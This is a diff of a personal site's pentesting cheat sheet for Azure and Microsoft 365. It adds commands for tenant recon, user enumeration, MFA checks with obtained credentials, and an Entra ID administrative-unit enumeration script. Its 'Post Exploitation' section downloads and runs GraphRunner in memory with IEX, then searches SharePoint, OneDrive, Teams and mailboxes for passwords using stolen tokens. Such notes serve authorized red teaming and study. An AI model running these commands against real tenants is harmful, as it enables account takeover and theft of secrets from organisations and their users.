@@ -20,10 +20,53 @@ aws s3api list-object-versions --bucket &lt;BUCKETNAME&gt; --query &#34;Versions
 </code></pre><p>AAD Internals</p><pre tabindex=0><code>Get-AADIntLoginInformation -Domain &lt;example.com&gt;
 Get-AADIntTenantID -Domain &lt;example.com&gt;
 Invoke-AADIntReconAsOutsider -DomainName &lt;example.com&gt;
-</code></pre><p>Azure Subdomain Enumeration</p><pre tabindex=0><code>#github https://github.com/yuyudhn/AzSubEnum
+https://aadinternals.com/osint/
+</code></pre><p>Azure Subdomain Enumeration</p><pre tabindex=0><code>Github https://github.com/yuyudhn/AzSubEnum
 python3 azsubenum.py -b domain -p permutations.txt -v
 </code></pre><p>Username Enumeration</p><pre tabindex=0><code>Github: https://github.com/0xZDH/Omnispray
 python3 omnispray.py -m o365_enum_office -d example.com -uf ~/Documents/userList.txt
+</code></pre><p>Checking Azure MFA (Assuming Credentials are obtained)</p><pre tabindex=0><code>Github: https://github.com/dafthack/MFASweep
+Invoke-MFASweep -Username &lt;Username&gt; -Password &lt;password&gt; -Recon -IncludeADFS
+</code></pre></div></div></div></div><div class=note-card><div class=item><h5 class=note-title><span>Post Exploitation</span></h5><div class=card><div class=card-body><p>GraphRunner to enumerate Office Products</p><pre tabindex=0><code>IEX (iwr &#39;https://raw.githubusercontent.com/dafthack/GraphRunner/main/GraphRunner.ps1&#39;)
+Invoke-SearchSharePointAndOneDrive -Tokens $tokens -SearchTerm &#39;password filetype:xlsx&#39;
+Invoke-SearchTeams -Tokens $tokens -SearchTerm password
+Invoke-SearchMailbox -Tokens $tokens -SearchTerm &#34;password&#34; -MessageCount 50
+</code></pre></div></div></div></div><div class=note-card><div class=item><h5 class=note-title><span>Az and Graph Powershell Modules</span></h5><div class=card><div class=card-body><p>Setup Az and Graph Powershell Modules</p><pre tabindex=0><code>Install-Module Az
+Import-Module Az
+Connect-AzAccount
+
+Install-Module Microsoft.Graph
+Import-Module Microsoft.Graph
+Connect-MgGraph
+</code></pre><p>Microsoft Graph Powershell Enumeration</p><pre tabindex=0><code>#Get user Info
+Get-MgUser -UserId &lt;email&gt; | fl
+#Get AU Info
+Get-MgDirectoryAdministrativeUnit | fl
+
+#Get Roles associated with an AU
+$ScopedRoleMembers = Get-MgDirectoryAdministrativeUnitScopedRoleMember -AdministrativeUnitId &lt;AU-ID&gt;
+Get-MgDirectoryRole -DirectoryRoleId &lt;RoleID&gt; | fl
+
+#Find Users who are members of the Role
+foreach ($member in $ScopedRoleMembers) {
+    $userId = $member.RoleMemberInfo.Id
+    
+    if (-not $userId) {
+        Write-Output &#34;No user ID available for member with Role ID: $($member.RoleId)&#34;
+        continue
+    }
+
+    $userDetails = Get-MgUser -UserId $userId
+    
+    if ($userDetails) {
+        Write-Output &#34;User Details: Name - $($userDetails.DisplayName), Email - $($userDetails.Mail), Role ID - $($member.RoleId)&#34;
+    } else {
+        Write-Output &#34;Failed to retrieve details for user ID: $userId&#34;
+    }
+}
+
+#Checking Members of the AU
+Get-MgDirectoryAdministrativeUnitMember -AdministrativeUnitId &lt;AU-ID&gt;
 </code></pre></div></div></div></div></div><div class=paginator></div></div></section></div><footer id=footer class="container-fluid text-center align-content-center footer pb-2"><div class="container pt-5"><div class="row text-start"><div class="col-md-4 col-sm-12"><h5>Navigation</h5><ul><li class=nav-item><a class=smooth-scroll href=https://cipolone95.github.io/#about>About</a></li><li class=nav-item><a class=smooth-scroll href=https://cipolone95.github.io/#skills>Skills</a></li><li class=nav-item><a class=smooth-scroll href=https://cipolone95.github.io/#experiences>Experiences</a></li><li class=nav-item><a class=smooth-scroll href=https://cipolone95.github.io/#education>Education</a></li><li class=nav-item><a class=smooth-scroll href=https://cipolone95.github.io/#projects>Projects</a></li><li class=nav-item><a class=smooth-scroll href=https://cipolone95.github.io/#recent-posts>Recent Posts</a></li><li class=nav-item><a class=smooth-scroll href=https://cipolone95.github.io/#accomplishments>Accomplishments</a></li></ul></div><div class="col-md-4 col-sm-12"><h5>Contact me:</h5><ul><li><a href=mailto:pete@petercipolone.info target=_blank rel=noopener><span><i class="fas fa-envelope"></i></span> <span>pete@petercipolone.info</span></a></li><li><a href=https://github.com/cipolone95 target=_blank rel=noopener><span><i class="fab fa-github"></i></span> <span>cipolone95</span></a></li><li><a href=https://www.linkedin.com/in/peter-cipolone target=_blank rel=noopener><span><i class="fab fa-linkedin"></i></span> <span>Pete Cipolone</span></a></li><li><a href=tel:+1 target=_blank rel=noopener><span><i class="fas fa-phone-alt"></i></span> <span>+1</span></a></li><li><a href=https://www.researchgate.net/profile/%25!s%28%3cnil%3e%29 target=_blank rel=noopener><span><i class="fab fa-researchgate"></i></span> <span>Pete Cipolone</span></a></li></ul></div></div></div><hr><div class=container><p id=disclaimer><strong>Liability Notice:</strong> This theme is under MIT license. So, you can use it for non-commercial, commercial, or private uses. You can modify or distribute the theme without requiring any permission from the theme author. However, the theme author does not provide any warranty or takes any liability for any issue with the theme.</p></div><hr><div class=container><div class="row text-start"><div class=col-md-4><a id=theme href=https://github.com/hugo-toha/toha target=_blank rel=noopener><img src=/images/theme-logo_hu_b3360284c55cf72d.png alt="Toha Theme Logo">
 Toha</a></div><div class="col-md-4 text-center">© 2024 Copyright.</div><div class="col-md-4 text-end"><a id=hugo href=https://gohugo.io/ target=_blank rel=noopener>Powered by
 <img src=/images/hugo-logo.svg alt="Hugo Logo" height=18></a></div></div></div></footer><script src=/application.a693247e55003ad0d03a5192345157b19e3fd68c8bee490d7cea98b988413aee.js integrity="sha256-ppMkflUAOtDQOlGSNFFXsZ4/1oyL7kkNfOqYuYhBOu4=" defer></script></body></html>
